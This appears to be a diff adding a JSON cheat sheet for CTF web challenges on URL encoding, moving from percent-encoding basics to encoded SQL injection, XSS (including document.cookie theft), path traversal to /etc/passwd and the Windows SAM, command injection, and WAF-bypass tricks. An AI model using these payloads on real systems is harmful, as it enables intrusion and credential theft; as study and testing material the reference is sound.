@@ -1,0 +1,63 @@
+{
+  "title": "URL Encoding & Web Exploitation",
+  "category": "Web",
+  "description": "URL encoding, decoding, and bypass techniques for web security testing",
+  "entries": [
+    {
+      "name": "URL Encoding Basics",
+      "desc": "Understanding percent encoding and when it's needed in URLs.",
+      "example": "URL Encoding (Percent Encoding)\n================================\n\nFormat: %XX (where XX is hex ASCII value)\n\nCommon Characters:\n------------------\nSpace      → %20 or +\n!          → %21\n\"          → %22\n#          → %23 (fragment)\n$          → %24\n%          → %25\n&          → %26 (parameter separator)\n'          → %27\n(          → %28\n)          → %29\n*          → %2A\n+          → %2B\n,          → %2C\n/          → %2F (path separator)\n:          → %3A\n;          → %3B\n=          → %3D (value separator)\n?          → %3F (query start)\n@          → %40\n[          → %5B\n\\          → %5C\n]          → %5D\n{          → %7B\n|          → %7C\n}          → %7D\n~          → %7E\n\nReserved Characters in URLs:\n/ ? # [ ] @ ! $ & ' ( ) * + , ; =\n\nMust encode if used as data (not syntax)\n\nExample URL:\nhttps://example.com/search?q=hello%20world&filter=%3Cscript%3E",
+      "flag_hint": "In CTF web challenges, URL encoding is crucial for passing special characters and bypassing filters.",
+      "tags": ["url", "encoding", "reference", "web"]
+    },
+    {
+      "name": "Encoding & Decoding Commands",
+      "desc": "Command-line tools for URL encoding and decoding.",
+      "example": "# Python - URL encode\npython3 -c \"import urllib.parse; print(urllib.parse.quote('hello world'))\"\n# Output: hello%20world\n\npython3 -c \"import urllib.parse; print(urllib.parse.quote('<script>'))\"\n# Output: %3Cscript%3E\n\n# Python - URL decode\npython3 -c \"import urllib.parse; print(urllib.parse.unquote('hello%20world'))\"\n# Output: hello world\n\npython3 -c \"import urllib.parse; print(urllib.parse.unquote('%3Cscript%3E'))\"\n# Output: <script>\n\n# Node.js - encode\nnode -e \"console.log(encodeURIComponent('hello world'))\"\n# Output: hello%20world\n\n# Node.js - decode\nnode -e \"console.log(decodeURIComponent('hello%20world'))\"\n# Output: hello world\n\n# Bash/jq for JSON API responses\necho '{\"data\":\"hello%20world\"}' | jq -r '.data' | python3 -c \"import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))\"\n\n# curl with encoding\ncurl \"http://example.com/search?q=$(python3 -c 'import urllib.parse;print(urllib.parse.quote(\"hello world\"))')\"\n\n# Batch encode file\nwhile read line; do\n  python3 -c \"import urllib.parse; print(urllib.parse.quote('$line'))\"\ndone < input.txt",
+      "flag_hint": "Use these commands to encode/decode data when interacting with web APIs or analyzing captured requests.",
+      "tags": ["encoding", "decoding", "python", "commands"]
+    },
+    {
+      "name": "Double & Triple Encoding",
+      "desc": "Bypassing filters by encoding multiple times.",
+      "example": "# Single encoding\n<script>  →  %3Cscript%3E\n\n# Double encoding (encode the % signs)\n<script>  →  %3Cscript%3E  →  %253Cscript%253E\n\n# Triple encoding\n<script>  →  %3Cscript%3E  →  %253Cscript%253E  →  %25253Cscript%25253E\n\n# Python double encode\npython3 -c \"import urllib.parse as u; s='<script>'; print(u.quote(u.quote(s)))\"\n# Output: %253Cscript%253E\n\n# Python triple encode\npython3 -c \"import urllib.parse as u; s='<script>'; print(u.quote(u.quote(u.quote(s))))\"\n# Output: %25253Cscript%25253E\n\n# Bypass WAF example\nOriginal:     /admin/delete?id=1\nSingle:       /admin/delete?id%3D1\nDouble:       /admin/delete?id%253D1\n\n# SQL injection with double encoding\nOriginal:     ' OR 1=1--\nSingle:       %27%20OR%201%3D1--\nDouble:       %2527%2520OR%25201%253D1--\n\n# Command injection\nOriginal:     ; cat /etc/passwd\nSingle:       %3B%20cat%20%2Fetc%2Fpasswd\nDouble:       %253B%2520cat%2520%252Fetc%252Fpasswd\n\n# Test in Burp Suite or curl\ncurl \"http://example.com/api?param=%253Cscript%253Ealert(1)%253C%252Fscript%253E\"",
+      "flag_hint": "Double encoding often bypasses WAFs and input filters. Try it when single encoding is blocked.",
+      "tags": ["double-encoding", "bypass", "waf", "advanced"]
+    },
+    {
+      "name": "SQL Injection Encoding",
+      "desc": "URL encoding techniques for SQL injection attacks.",
+      "example": "# Basic SQL injection\n' OR 1=1--\n%27%20OR%201%3D1--\n\n# Union-based injection\n' UNION SELECT null,username,password FROM users--\n%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--\n\n# Encoded single quote variations\n'    → %27 (standard)\n'    → %2527 (double encoded)\n'    → %u0027 (Unicode, legacy IE)\n'    → \\x27 (hex literal in some contexts)\n\n# Space bypass techniques\nSpace → %20 (standard)\nSpace → + (form data)\nSpace → %09 (tab)\nSpace → %0A (newline)\nSpace → %0D (carriage return)\nSpace → /**/ (SQL comment)\nSpace → %A0 (non-breaking space)\n\n# Comment encodings\n--   → %2D%2D\n#    → %23\n/*   → %2F%2A\n\n# Keywords encoded\nSELECT → %53%45%4C%45%43%54\nUNION  → %55%4E%49%4F%4E\nWHERE  → %57%48%45%52%45\n\n# Combined example\nhttp://example.com/product?id=1%27%20UNION%20SELECT%20null,version()--\n\n# With double encoding to bypass WAF\nhttp://example.com/product?id=1%2527%2520UNION%2520SELECT%2520null,version()--",
+      "flag_hint": "When SQL injection is detected but blocked, try encoding characters differently or using double encoding.",
+      "tags": ["sqli", "sql-injection", "encoding", "bypass"]
+    },
+    {
+      "name": "XSS (Cross-Site Scripting) Encoding",
+      "desc": "URL encoding for XSS payloads and filter evasion.",
+      "example": "# Basic XSS payload\n<script>alert(1)</script>\n%3Cscript%3Ealert(1)%3C%2Fscript%3E\n\n# Event handlers\n<img src=x onerror=alert(1)>\n%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E\n\n# JavaScript protocol\n<a href=\"javascript:alert(1)\">Click</a>\n%3Ca%20href%3D%22javascript%3Aalert(1)%22%3EClick%3C%2Fa%3E\n\n# Encoded characters in script\n<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>  # alert\n<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>\n\n# HTML entity encoding (not URL encoding)\n<script>alert(1)</script>\n&lt;script&gt;alert(1)&lt;/script&gt;\n\n# Mixed encoding bypass\n<scr%69pt>alert(1)</scr%69pt>  # i = %69\n<scr\\x69pt>alert(1)</scr\\x69pt>\n\n# Null byte bypass (legacy)\n<script%00>alert(1)</script>\n\n# Newline bypass\n<script%0a>alert(1)</script>\n<script%0d>alert(1)</script>\n\n# Full payload encoded\nhttp://example.com/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E\n\n# Double encoded for WAF bypass\nhttp://example.com/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+      "flag_hint": "XSS challenges often require creative encoding. Try mixing URL, hex, unicode, and HTML entity encoding.",
+      "tags": ["xss", "cross-site-scripting", "encoding", "bypass"]
+    },
+    {
+      "name": "Path Traversal Encoding",
+      "desc": "URL encoding for directory traversal attacks.",
+      "example": "# Basic path traversal\n../../etc/passwd\n..%2F..%2Fetc%2Fpasswd\n\n# Double encoded\n..%252F..%252Fetc%252Fpasswd\n\n# Alternative encodings for /\n/    → %2F (standard)\n/    → %2f (lowercase)\n/    → %252F (double)\n/    → %c0%af (UTF-8 overlong)\n/    → %e0%80%af (UTF-8 overlong)\n\n# Alternative encodings for .\n.    → %2E (standard)\n.    → %2e (lowercase)\n.    → %252E (double)\n\n# Windows path traversal\n..\\..\\windows\\system32\\config\\sam\n..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam\n\n# Alternative encodings for \\\n\\    → %5C (standard)\n\\    → %5c (lowercase)\n\\    → %255C (double)\n\n# 16-bit Unicode encoding\n/    → %u002F\n\\    → %u005C\n.    → %u002E\n\n# Combined examples\nhttp://example.com/download?file=..%2F..%2Fetc%2Fpasswd\nhttp://example.com/image?path=..%252F..%252Fflag.txt\nhttp://example.com/file?name=%2E%2E%2F%2E%2E%2Fsecret.txt\n\n# Null byte bypass (legacy PHP)\nhttp://example.com/file?name=../../../../etc/passwd%00.jpg\nhttp://example.com/file?name=..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg",
+      "flag_hint": "Path traversal in CTFs often requires encoding. Try different slash encodings and check for null byte vulnerabilities.",
+      "tags": ["path-traversal", "lfi", "encoding", "bypass"]
+    },
+    {
+      "name": "Command Injection Encoding",
+      "desc": "URL encoding for command injection payloads.",
+      "example": "# Basic command injection\n; ls\n%3B%20ls\n\n# Multiple separators\n| ls\n%7C%20ls\n\n& ls\n%26%20ls\n\n&& ls\n%26%26%20ls\n\n|| ls\n%7C%7C%20ls\n\n# Command substitution\n$(whoami)\n%24(whoami)\n%24%28whoami%29\n\n`whoami`\n%60whoami%60\n\n# Newline injection\n%0Als\n%0Dwhoami\n%0A%0Dcat%20flag.txt\n\n# Space alternatives\ncat%20flag.txt  # %20 (space)\ncat+flag.txt    # + (in form data)\ncat%09flag.txt  # %09 (tab)\ncat${IFS}flag.txt  # Using IFS\n\n# Read files\ncat%20/etc/passwd\ncat%20flag.txt\nhead%20-n%2010%20flag.txt\n\n# Combined payload\nhttp://example.com/ping?ip=127.0.0.1%3B%20cat%20/etc/passwd\nhttp://example.com/ping?ip=127.0.0.1%7C%7C%20ls%20-la\nhttp://example.com/ping?ip=127.0.0.1%60whoami%60\n\n# Double encoded to bypass WAF\nhttp://example.com/ping?ip=127.0.0.1%253B%2520cat%2520flag.txt\n\n# Full encoding of entire command\nhttp://example.com/exec?cmd=%63%61%74%20%66%6c%61%67%2e%74%78%74\n# Decodes to: cat flag.txt",
+      "flag_hint": "Command injection often requires URL encoding. Try different separators and encoding levels to bypass filters.",
+      "tags": ["command-injection", "rce", "encoding", "bypass"]
+    },
+    {
+      "name": "Unicode & UTF-8 Tricks",
+      "desc": "Advanced encoding techniques using Unicode normalization and overlong UTF-8.",
+      "example": "# Overlong UTF-8 encoding (legacy vulnerability)\n/    → %c0%af (should be %2F)\n\\    → %c0%5c (should be %5C)\n<    → %c0%bc (should be %3C)\n\n# 3-byte overlong\n/    → %e0%80%af\n\\    → %e0%80%5c\n\n# Unicode normalization\n﹤script﹥  → <script> (after normalization)\n%ef%b9%a4script%ef%b9%a5\n\n# Full-width characters\n＜script＞  → <script>\n%ef%bc%9cscript%ef%bc%9e\n\n# Unicode right-to-left override\nExample: admin%E2%80%AE%E2%80%AC\nDisplays in reverse but processed normally\n\n# Homograph attack\nаdmin (Cyrillic 'а') vs admin (Latin 'a')\n%D0%B0dmin vs admin\n\n# Zero-width characters\nZero-Width Space (U+200B): %E2%80%8B\nZero-Width Joiner (U+200D): %E2%80%8D\n\n# Example: bypass keyword filter\nad%E2%80%8Bmin (has zero-width space)\nse%E2%80%8Blect (bypasses 'select' filter)\n\n# Combining characters\na\u0300 (a with grave accent)\n%61%CC%80\n\n# Case variations\nADMIN vs admin vs AdMiN\n%41%44%4D%49%4E vs %61%64%6D%69%6E\n\n# IIS tilde enumeration\n/admin~1.asp  → Reveals /admin.aspx\n/admin%7E1.asp",
+      "flag_hint": "Unicode tricks are powerful for bypassing filters. Many WAFs don't normalize Unicode before checking.",
+      "tags": ["unicode", "utf8", "normalization", "advanced", "bypass"]
+    }
+  ]
+}
